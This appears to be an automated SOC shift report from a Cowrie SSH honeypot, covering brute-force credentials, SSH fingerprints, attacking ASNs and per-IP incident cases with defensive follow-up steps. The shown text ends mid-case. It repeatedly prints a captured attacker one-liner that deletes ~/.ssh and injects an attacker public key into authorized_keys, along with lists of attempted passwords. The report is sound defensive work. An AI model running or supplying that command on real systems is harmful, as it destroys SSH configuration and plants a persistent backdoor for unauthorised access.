# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-04 |
| **Generated At** | 2026-04-04T20:28:59Z |
| **Shift Time** | 20:28 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **70** |
| Confirmed Threats | **66** |
| False Positives Filtered | **4** (5.7%) |
| Unique Attacker IPs | **23** |
| Countries of Origin | **10** |
| High Severity Cases | **20** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **50** |
| Malware Samples Analyzed | **0** HIGH · **15** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **63** |
| Unique Credential Pairs | **46** |
| Unique Usernames | **28** |
| Unique Passwords | **45** |
| Successful Auth Pairs | **12** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 20 |
| `345gs5662d34` | 9 |
| `ubuntu` | 4 |
| `postgres` | 3 |
| `Default` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 9 |
| `3245gs5662d34` | 9 |
| `2222` | 2 |
| `123456` | 2 |
| `qwerty` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 9 |
| `root` | `3245gs5662d34` | 9 |
| `root` | `2222` | 2 |
| `postgres` | `qwerty` | 1 |
| `Nobody` | `P@ssw0rd` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `2222` | `211.104.166.110` | 2026-04-04T19:15:06 |
| `root` | `2222` | `112.91.214.71` | 2026-04-04T19:15:19 |
| `root` | `root111@` | `101.36.106.145` | 2026-04-04T19:31:11 |
| `root` | `3245gs5662d34` | `101.36.106.145` | 2026-04-04T19:31:14 |
| `root` | `Space123` | `101.36.106.145` | 2026-04-04T19:35:43 |
| `root` | `Yl123456` | `101.36.106.145` | 2026-04-04T19:49:09 |
| `root` | `root321!@#` | `101.36.106.145` | 2026-04-04T19:53:31 |
| `root` | `5454` | `101.36.106.145` | 2026-04-04T19:57:57 |
| `root` | `root2025@@` | `101.36.106.145` | 2026-04-04T20:02:34 |
| `root` | `qazwsx9999!@` | `101.36.106.145` | 2026-04-04T20:09:16 |
| `root` | `A1234562` | `101.36.106.145` | 2026-04-04T20:15:57 |
| `root` | `a12345661` | `101.36.106.145` | 2026-04-04T20:18:16 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **70** |
| Sessions with Fingerprint | **2** |
| Unique HASSH Fingerprints | **2** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 49 |
| OpenSSH | 14 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 49 | 2 |
| `acaa53e0a7d7...` | Mirai/variant | 14 | 14 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 49 | 2 | Modern SSH client |
| `acaa53e0a7d7...` | OpenSSH | 14 | 14 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 9 | 1 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `101.36.106.145`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **23** |
| Unique ASNs | **20** |
| High-Risk ASNs | **18** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS46562` | Performive LLC | 3 | MEDIUM |
| `AS9498` | BHARTI Airtel Ltd. | 2 | HIGH |
| `AS16276` | OVH SAS | 1 | HIGH |
| `AS9318` | SK Broadband Co Ltd | 1 | HIGH |
| `AS134886` | Super Sonic Broadband Pvt Ltd | 1 | HIGH |
| `AS4808` | China Unicom Beijing Province Network | 1 | HIGH |
| `AS8075` | Microsoft Corporation | 1 | LOW |
| `AS4818` | DiGi Telecommunications Sdn. Bhd. | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (20)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-ee29d1c06f5f

| Field | Detail |
|---|---|
| **Source IP** | `211.104.166[.]110` |
| **First Seen** | 2026-04-04 19:15 |
| **Last Seen** | 2026-04-04 19:15 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-04 19:15:03` | `cowrie.session.connect` |
| `2026-04-04 19:15:04` | `cowrie.client.version` |
| `2026-04-04 19:15:04` | `cowrie.client.kex` |
| `2026-04-04 19:15:06` | `cowrie.login.success` |
| `2026-04-04 19:15:07` | `cowrie.direct-tcpip.request` |
| `2026-04-04 19:15:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.104.166[.]110` to AbuseIPDB if not already reported
- [ ] Block `211.104.166[.]110` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c523769a1ed2

| Field | Detail |
|---|---|
| **Source IP** | `112.91.214[.]71` |
| **First Seen** | 2026-04-04 19:15 |
| **Last Seen** | 2026-04-04 19:15 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-04 19:15:17` | `cowrie.session.connect` |
| `2026-04-04 19:15:17` | `cowrie.client.version` |
| `2026-04-04 19:15:17` | `cowrie.client.kex` |
| `2026-04-04 19:15:19` | `cowrie.login.success` |
| `2026-04-04 19:15:19` | `cowrie.direct-tcpip.request` |
| `2026-04-04 19:15:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.91.214[.]71` to AbuseIPDB if not already reported
- [ ] Block `112.91.214[.]71` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b68dbf6d28f

| Field | Detail |
|---|---|
| **Source IP** | `101.36.106[.]145` |
| **First Seen** | 2026-04-04 19:31 |
| **Last Seen** | 2026-04-04 19:31 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-04 19:31:11` | `cowrie.session.connect` |
| `2026-04-04 19:31:11` | `cowrie.client.version` |
| `2026-04-04 19:31:11` | `cowrie.client.kex` |
| `2026-04-04 19:31:11` | `cowrie.login.success` |
| `2026-04-04 19:31:11` | `cowrie.session.params` |
| `2026-04-04 19:31:11` | `cowrie.command.input` |
| `2026-04-04 19:31:11` | `cowrie.command.failed` |
| `2026-04-04 19:31:11` | `cowrie.log.closed` |
| `2026-04-04 19:31:12` | `cowrie.session.params` |
| `2026-04-04 19:31:12` | `cowrie.command.input` |
| `2026-04-04 19:31:12` | `cowrie.session.file_download` |
| `2026-04-04 19:31:12` | `cowrie.log.closed` |
| `2026-04-04 19:31:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.106[.]145` to AbuseIPDB if not already reported
- [ ] Block `101.36.106[.]145` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12165e1f905a

| Field | Detail |
|---|---|
| **Source IP** | `101.36.106[.]145` |
| **First Seen** | 2026-04-04 19:31 |
| **Last Seen** | 2026-04-04 19:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-04 19:31:14` | `cowrie.session.connect` |
| `2026-04-04 19:31:14` | `cowrie.client.version` |
| `2026-04-04 19:31:14` | `cowrie.client.kex` |
| `2026-04-04 19:31:14` | `cowrie.login.success` |
| `2026-04-04 19:31:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.106[.]145` to AbuseIPDB if not already reported
- [ ] Block `101.36.106[.]145` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-459ec08f5d25

| Field | Detail |
|---|---|
| **Source IP** | `101.36.106[.]145` |
| **First Seen** | 2026-04-04 19:35 |
| **Last Seen** | 2026-04-04 19:35 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-04 19:35:43` | `cowrie.session.connect` |
| `2026-04-04 19:35:43` | `cowrie.client.version` |
| `2026-04-04 19:35:43` | `cowrie.client.kex` |
| `2026-04-04 19:35:43` | `cowrie.login.success` |
| `2026-04-04 19:35:44` | `cowrie.session.params` |
| `2026-04-04 19:35:44` | `cowrie.command.input` |
| `2026-04-04 19:35:44` | `cowrie.command.failed` |
| `2026-04-04 19:35:44` | `cowrie.log.closed` |
| `2026-04-04 19:35:44` | `cowrie.session.params` |
| `2026-04-04 19:35:44` | `cowrie.command.input` |
| `2026-04-04 19:35:44` | `cowrie.session.file_download` |
| `2026-04-04 19:35:44` | `cowrie.log.closed` |
| `2026-04-04 19:35:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.106[.]145` to AbuseIPDB if not already reported
- [ ] Block `101.36.106[.]145` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b10c9f65f13

| Field | Detail |
|---|---|
| **Source IP** | `101.36.106[.]145` |
| **First Seen** | 2026-04-04 19:35 |
| **Last Seen** | 2026-04-04 19:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-04 19:35:46` | `cowrie.session.connect` |
| `2026-04-04 19:35:46` | `cowrie.client.version` |
| `2026-04-04 19:35:46` | `cowrie.client.kex` |
| `2026-04-04 19:35:46` | `cowrie.login.success` |
| `2026-04-04 19:35:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.106[.]145` to AbuseIPDB if not already reported
- [ ] Block `101.36.106[.]145` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f3b1a701e373

| Field | Detail |
|---|---|
| **Source IP** | `101.36.106[.]145` |
| **First Seen** | 2026-04-04 19:49 |
| **Last Seen** | 2026-04-04 19:49 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-04 19:49:09` | `cowrie.session.connect` |
| `2026-04-04 19:49:09` | `cowrie.client.version` |
| `2026-04-04 19:49:09` | `cowrie.client.kex` |
| `2026-04-04 19:49:09` | `cowrie.login.success` |
| `2026-04-04 19:49:10` | `cowrie.session.params` |
| `2026-04-04 19:49:10` | `cowrie.command.input` |
| `2026-04-04 19:49:10` | `cowrie.command.failed` |
| `2026-04-04 19:49:10` | `cowrie.log.closed` |
| `2026-04-04 19:49:10` | `cowrie.session.params` |
| `2026-04-04 19:49:10` | `cowrie.command.input` |
| `2026-04-04 19:49:10` | `cowrie.session.file_download` |
| `2026-04-04 19:49:10` | `cowrie.log.closed` |
| `2026-04-04 19:49:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.106[.]145` to AbuseIPDB if not already reported
- [ ] Block `101.36.106[.]145` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c791ac33210

| Field | Detail |
|---|---|
| **Source IP** | `101.36.106[.]145` |
| **First Seen** | 2026-04-04 19:49 |
| **Last Seen** | 2026-04-04 19:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-04 19:49:12` | `cowrie.session.connect` |
| `2026-04-04 19:49:12` | `cowrie.client.version` |
| `2026-04-04 19:49:12` | `cowrie.client.kex` |
| `2026-04-04 19:49:12` | `cowrie.login.success` |
| `2026-04-04 19:49:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.106[.]145` to AbuseIPDB if not already reported
- [ ] Block `101.36.106[.]145` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-64ac2d0f6ecc

| Field | Detail |
|---|---|
| **Source IP** | `101.36.106[.]145` |
| **First Seen** | 2026-04-04 19:53 |
| **Last Seen** | 2026-04-04 19:53 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-04 19:53:31` | `cowrie.session.connect` |
| `2026-04-04 19:53:31` | `cowrie.client.version` |
| `2026-04-04 19:53:31` | `cowrie.client.kex` |
| `2026-04-04 19:53:31` | `cowrie.login.success` |
| `2026-04-04 19:53:32` | `cowrie.session.params` |
| `2026-04-04 19:53:32` | `cowrie.command.input` |
| `2026-04-04 19:53:32` | `cowrie.command.failed` |
| `2026-04-04 19:53:32` | `cowrie.log.closed` |
| `2026-04-04 19:53:32` | `cowrie.session.params` |
| `2026-04-04 19:53:32` | `cowrie.command.input` |
| `2026-04-04 19:53:32` | `cowrie.session.file_download` |
| `2026-04-04 19:53:32` | `cowrie.log.closed` |
| `2026-04-04 19:53:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.106[.]145` to AbuseIPDB if not already reported
- [ ] Block `101.36.106[.]145` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-62a52afdacf4

| Field | Detail |
|---|---|
| **Source IP** | `101.36.106[.]145` |
| **First Seen** | 2026-04-04 19:53 |
| **Last Seen** | 2026-04-04 19:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-04 19:53:34` | `cowrie.session.connect` |
| `2026-04-04 19:53:34` | `cowrie.client.version` |
| `2026-04-04 19:53:34` | `cowrie.client.kex` |
| `2026-04-04 19:53:34` | `cowrie.login.success` |
| `2026-04-04 19:53:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.106[.]145` to AbuseIPDB if not already reported
- [ ] Block `101.36.106[.]145` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d2122ebb423f

| Field | Detail |
|---|---|
| **Source IP** | `101.36.106[.]145` |
| **First Seen** | 2026-04-04 19:57 |
| **Last Seen** | 2026-04-04 19:58 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-04 19:57:57` | `cowrie.session.connect` |
| `2026-04-04 19:57:57` | `cowrie.client.version` |
| `2026-04-04 19:57:57` | `cowrie.client.kex` |
| `2026-04-04 19:57:57` | `cowrie.login.success` |
| `2026-04-04 19:57:57` | `cowrie.session.params` |
| `2026-04-04 19:57:57` | `cowrie.command.input` |
| `2026-04-04 19:57:57` | `cowrie.command.failed` |
| `2026-04-04 19:57:58` | `cowrie.log.closed` |
| `2026-04-04 19:57:58` | `cowrie.session.params` |
| `2026-04-04 19:57:58` | `cowrie.command.input` |
| `2026-04-04 19:57:58` | `cowrie.session.file_download` |
| `2026-04-04 19:57:58` | `cowrie.log.closed` |
| `2026-04-04 19:58:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.106[.]145` to AbuseIPDB if not already reported
- [ ] Block `101.36.106[.]145` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-38540a8f55b1

| Field | Detail |
|---|---|
| **Source IP** | `101.36.106[.]145` |
| **First Seen** | 2026-04-04 19:58 |
| **Last Seen** | 2026-04-04 19:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-04 19:58:00` | `cowrie.session.connect` |
| `2026-04-04 19:58:00` | `cowrie.client.version` |
| `2026-04-04 19:58:00` | `cowrie.client.kex` |
| `2026-04-04 19:58:00` | `cowrie.login.success` |
| `2026-04-04 19:58:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.106[.]145` to AbuseIPDB if not already reported
- [ ] Block `101.36.106[.]145` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ebc1bbdc4fa

| Field | Detail |
|---|---|
| **Source IP** | `101.36.106[.]145` |
| **First Seen** | 2026-04-04 20:02 |
| **Last Seen** | 2026-04-04 20:02 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-04 20:02:33` | `cowrie.session.connect` |
| `2026-04-04 20:02:33` | `cowrie.client.version` |
| `2026-04-04 20:02:33` | `cowrie.client.kex` |
| `2026-04-04 20:02:34` | `cowrie.login.success` |
| `2026-04-04 20:02:34` | `cowrie.session.params` |
| `2026-04-04 20:02:34` | `cowrie.command.input` |
| `2026-04-04 20:02:34` | `cowrie.command.failed` |
| `2026-04-04 20:02:34` | `cowrie.log.closed` |
| `2026-04-04 20:02:34` | `cowrie.session.params` |
| `2026-04-04 20:02:34` | `cowrie.command.input` |
| `2026-04-04 20:02:34` | `cowrie.session.file_download` |
| `2026-04-04 20:02:34` | `cowrie.log.closed` |
| `2026-04-04 20:02:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.106[.]145` to AbuseIPDB if not already reported
- [ ] Block `101.36.106[.]145` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-29831682f8c9

| Field | Detail |
|---|---|
| **Source IP** | `101.36.106[.]145` |
| **First Seen** | 2026-04-04 20:02 |
| **Last Seen** | 2026-04-04 20:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-04 20:02:36` | `cowrie.session.connect` |
| `2026-04-04 20:02:36` | `cowrie.client.version` |
| `2026-04-04 20:02:36` | `cowrie.client.kex` |
| `2026-04-04 20:02:37` | `cowrie.login.success` |
| `2026-04-04 20:02:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.106[.]145` to AbuseIPDB if not already reported
- [ ] Block `101.36.106[.]145` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7bbfbc368852

| Field | Detail |
|---|---|
| **Source IP** | `101.36.106[.]145` |
| **First Seen** | 2026-04-04 20:09 |
| **Last Seen** | 2026-04-04 20:09 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
